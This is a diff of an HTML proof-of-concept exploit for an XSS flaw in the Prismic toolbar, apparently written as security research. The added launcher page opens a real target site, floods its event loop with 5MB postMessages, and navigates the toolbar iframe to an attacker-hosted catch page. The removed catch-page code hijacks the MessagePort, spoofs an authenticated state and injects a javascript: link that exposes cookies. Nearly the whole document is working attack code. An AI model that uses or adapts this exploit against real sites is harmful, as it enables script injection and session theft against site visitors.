@@ -1,115 +1,203 @@
 <!DOCTYPE html>
 <html>
-<head><title>Prismic Catch</title></head>
+<head>
+<title>Prismic Toolbar XSS via Iframe Hijack</title>
+<style>
+  body { font-family: monospace; background: #1a1a2e; color: #eee; padding: 20px; }
+  h1 { color: #e94560; }
+  #log { background: #16213e; padding: 15px; border-radius: 8px; max-height: 400px; overflow-y: auto; margin: 10px 0; }
+  .log-entry { margin: 4px 0; font-size: 13px; }
+  .success { color: #0f0; }
+  .error { color: #f00; }
+  .info { color: #0af; }
+  .warn { color: #fa0; }
+  button { background: #e94560; color: #fff; border: none; padding: 12px 24px; border-radius: 6px;
+           font-size: 16px; cursor: pointer; margin: 10px 5px; font-family: monospace; }
+  button:hover { background: #c73e54; }
+  input { background: #0d1117; color: #eee; border: 1px solid #333; padding: 8px 12px; border-radius: 4px;
+          font-family: monospace; font-size: 14px; width: 500px; }
+  label { display: block; margin: 8px 0 4px; color: #888; font-size: 12px; }
+</style>
+</head>
 <body>
+
+<label for="target">Target URL:</label>
+<input id="target" type="text" value="https://wetransfer.com/blog">
+
+<label for="catch">Catch page URL:</label>
+<input id="catch" type="text" value="https://daemoon.me/demo/poc-prismic-catch.html">
+
+<br>
+<button onclick="startAttack()">Launch</button>
+<button onclick="precache()">Pre-cache catch page</button>
+<div id="log"></div>
+
+<iframe name="victim" id="victim-frame" width="100%" height="500" style="border: 2px solid #333; border-radius: 4px; margin-top: 10px; background: #0d1117;"></iframe>
+
 <script>
-// Prismic Toolbar Iframe Hijack — Catch Page
-// ============================================
-// This page is navigated INTO the Prismic toolbar iframe via frames[0].location.
-// The parent's prismic.js sends SetupPort + MessagePort with '*' target origin:
-//   e.contentWindow.postMessage('setup_port', '*', [port2])
-// We intercept it and control all subsequent ToolbarClient communication.
-//
-// Chain:
-//   setup_port → port established → preview_state (auth:true) → toolbar renders
-//   → prediction_docs request arrives → we respond with javascript: editorUrl
-//   → toolbar.js:7461 renders <a href="javascript:..."> → XSS on click
-const SETUP_PORT = 'setup_port';
-const READY = 'ready';
-
-// Report status to top window (attacker PoC page) for debugging
-function report(msg) {
-  try { window.top.postMessage({type:'catch_status', msg: msg}, '*'); } catch(e) {}
+function log(msg, cls) {
+  var div = document.getElementById('log');
+  var ts = new Date().toISOString().substr(11, 12);
+  div.innerHTML += '<div class="log-entry ' + (cls || 'info') + '">[' + ts + '] ' + msg + '</div>';
+  div.scrollTop = div.scrollHeight;
 }
-report('Catch page loaded! Waiting for setup_port...');
 
+// Listen for status reports from catch page
 window.addEventListener('message', function(e) {
-  // Log ALL messages for debugging
-  report('Got message: ' + JSON.stringify(e.data).substring(0, 100) + ' ports=' + (e.ports ? e.ports.length : 0));
-
-  if (e.data === SETUP_PORT && e.ports && e.ports.length > 0) {
-    const port = e.ports[0];
-    report('setup_port RECEIVED! Port established.');
-
-    // Acknowledge — parent's establishConnection() resolves on 'ready'
-    port.postMessage(READY);
-
-    port.onmessage = function(msg) {
-      const { type, data } = msg.data;
-      report('Port msg: type=' + type);
-
-      switch(type) {
-
-        case 'preview_state':
-          report('→ Responding auth:true');
-          // auth:true → enables toolbar UI + prediction handler
-          // preview:null → avoids cookie-based reload loop
-          port.postMessage({
-            type: 'preview_state',
-            data: {
-              auth: true,
-              csrf: 'hijacked',
-              preview: null
-            }
-          });
-          break;
-
-        case 'prediction_docs':
-          report('→ Responding with javascript: editorUrl (XSS payload)');
-          // SINK: editorUrl → <a href={t.editorUrl}> in toolbar.js:7461
-          //        t.url    → <a href={t.url}>       in toolbar.js:4626
-          // No protocol validation. No sanitization. javascript: fires on click.
-          port.postMessage({
-            type: 'prediction_docs',
-            data: [
-              {
-                editorUrl: 'javascript:void(document.title="XSS_"+document.domain,alert("XSS\\n\\nDomain: "+document.domain+"\\nCookies: "+document.cookie.substring(0,200)))',
-                uid: 'xss-poc',
-                title: 'Edit this document in Prismic',
-                summary: 'Click to open in the Prismic editor',
-                type: 'page',
-                status: 'draft',
-                singleton: false,
-                isDocumentLink: false,
-                weight: 1,
-                urls: [],
-                queryTotal: 1,
-                updated: Date.now()
-              }
-            ]
-          });
-          break;
-
-        case 'dev_mode_queries_results':
-          port.postMessage({ type: 'dev_mode_queries_results', data: [] });
-          break;
-
-        case 'close_preview_session':
-          port.postMessage({ type: 'close_preview_session', data: null });
-          break;
-
-        case 'track_toolbar_setup':
-          port.postMessage({ type: 'track_toolbar_setup', data: null });
-          break;
-
-        case 'track_document_click':
-          port.postMessage({ type: 'track_document_click', data: null });
-          break;
-
-        case 'update_preview':
-          port.postMessage({ type: 'update_preview', data: { reload: false, ref: null } });
-          break;
-
-        case 'share_preview':
-          port.postMessage({ type: 'share_preview', data: null });
-          break;
-
-        default:
-          port.postMessage({ type: type, data: null });
-      }
-    };
+  if (e.data && e.data.type === 'catch_status') {
+    log('[CATCH] ' + e.data.msg, 'warn');
   }
 });
+
+// ============================================================
+// TECHNIQUE 1: Pre-cache the catch page (Youssef Sammouda)
+// Load catch page in hidden iframe so browser caches it.
+// When we navigate the Prismic iframe to it, it loads from
+// cache (~1ms) instead of network (~200ms).
+// ============================================================
+var cached = false;
+function precache() {
+  var url = document.getElementById('catch').value;
+  var f = document.createElement('iframe');
+  f.style.cssText = 'width:0;height:0;border:0;position:absolute;left:-9999px';
+  f.src = url;
+  f.onload = function() {
+    cached = true;
+    log('Catch page pre-cached!', 'success');
+    document.body.removeChild(f);
+  };
+  document.body.appendChild(f);
+}
+// Auto pre-cache on page load
+window.addEventListener('load', function() { precache(); });
+
+// ============================================================
+// TECHNIQUE 2: Event-loop flooding (5MB postMessages)
+// Structured clone deserialization of a 5MB string takes ~5-50ms
+// per message in the victim's event loop. Any window.onmessage
+// handler that accesses event.data triggers this (Auth0, GTM,
+// analytics, consent banners, etc. all check event.data).
+//
+// This delays the iframe's {once:true} load handler from firing.
+// By the time prismic.js processes the load event and calls
+// n.contentWindow.postMessage('setup_port'), contentWindow
+// points to our cached catch page instead of the real prismic.io.
+// ============================================================
+var FLOOD_PAYLOAD = null; // Built lazily
+
+function buildFloodPayload() {
+  if (!FLOOD_PAYLOAD) {
+    // 5MB string. Wrapped in object so handlers checking event.data.type
+    // must access event.data first, triggering full deserialization.
+    var big = [];
+    for (var i = 0; i < 5 * 1024 * 1024; i += 1024) {
+      big.push('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' +
+               'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' +
+               'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' +
+               'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' +
+               'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' +
+               'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' +
+               'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' +
+               'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' +
+               'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' +
+               'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' +
+               'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' +
+               'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' +
+               'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' +
+               'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' +
+               'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' +
+               'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA');
+    }
+    FLOOD_PAYLOAD = big.join('');
+    log('Flood payload built: ' + (FLOOD_PAYLOAD.length / 1024 / 1024).toFixed(1) + ' MB', 'info');
+  }
+  return FLOOD_PAYLOAD;
+}
+
+function startAttack() {
+  var TARGET = document.getElementById('target').value;
+  var CATCH_URL = document.getElementById('catch').value;
+  var payload = buildFloodPayload();
+
+  log('=== Prismic Toolbar XSS — Event Loop Flood ===', 'warn');
+  log('Target: ' + TARGET, 'info');
+  log('Catch page: ' + CATCH_URL + (cached ? ' (pre-cached)' : ' (NOT cached!)'), 'info');
+
+  // Step 1: Open target in named iframe
+  var x = window.open(TARGET, "victim");
+  if (!x) {
+    log('Popup blocked! Allow popups for this site.', 'error');
+    return;
+  }
+  log('Target loading in victim frame...', 'success');
+
+  // Step 2: IMMEDIATELY start flooding the victim's event loop.
+  // These messages queue up during page load (synchronous JS blocks event loop).
+  // When prismic.js hits its first `await` (for the iframe load), the event loop
+  // starts draining OUR flood messages first — delaying the load handler.
+  var floodCount = 0;
+  var floodInterval = setInterval(function() {
+    try {
+      x.postMessage(payload, '*');
+      floodCount++;
+    } catch(e) {
+      // Window might not be ready yet, keep trying
+    }
+  }, 1);
+
+  log('Flooding started (5MB/msg, ~1000/sec)...', 'warn');
+
+  // Step 3: Aggressive polling for sub-frames. Navigate ALL new ones.
+  var knownCount = 0;
+  var navigated = 0;
+  var startTime = Date.now();
+
+  var poller = setInterval(function() {
+    try {
+      var len = x.length; // Cross-origin accessible (Firefox)
+      if (len > knownCount) {
+        var elapsed = Date.now() - startTime;
+        log('Frames: ' + knownCount + ' -> ' + len + ' (at ' + elapsed + 'ms)', 'success');
+
+        for (var i = knownCount; i < len; i++) {
+          try {
+            x[i].location.href = CATCH_URL;
+            navigated++;
+            log('  -> Navigated frames[' + i + '] to catch page', 'success');
+          } catch(e) {
+            log('  -> frames[' + i + '] nav failed: ' + e.message, 'warn');
+          }
+        }
+        knownCount = len;
+      }
+    } catch(e) {
+      // cross-origin access issue, keep polling
+    }
+  }, 5); // Poll every 5ms (aggressive)
+
+  // Step 4: Stop flooding after 8 seconds.
+  // By then, prismic.js has created its iframe, CDN content loaded,
+  // but the load handler is stuck behind our flood.
+  // We've navigated the iframe, catch page loaded from cache.
+  // When flood stops, parent processes the delayed load event:
+  //   n.contentWindow → our catch page → setup_port sent to us!
+  setTimeout(function() {
+    clearInterval(floodInterval);
+    log('Flood stopped. Sent ' + floodCount + ' messages (' +
+        ((floodCount * 5).toFixed(0)) + ' MB total)', 'info');
+  }, 8000);
+
+  // Step 5: Stop polling after 20 seconds
+  setTimeout(function() {
+    clearInterval(poller);
+    log('Polling stopped. Navigated ' + navigated + ' frame(s).', 'info');
+    if (navigated > 0) {
+      log('Waiting for delayed setup_port... toolbar icon appears bottom-left -> click -> XSS', 'warn');
+    } else {
+      log('No frames detected. Try in Firefox (Chromium hides cross-origin subframes).', 'error');
+    }
+  }, 20000);
+}
 </script>
 </body>
 </html>
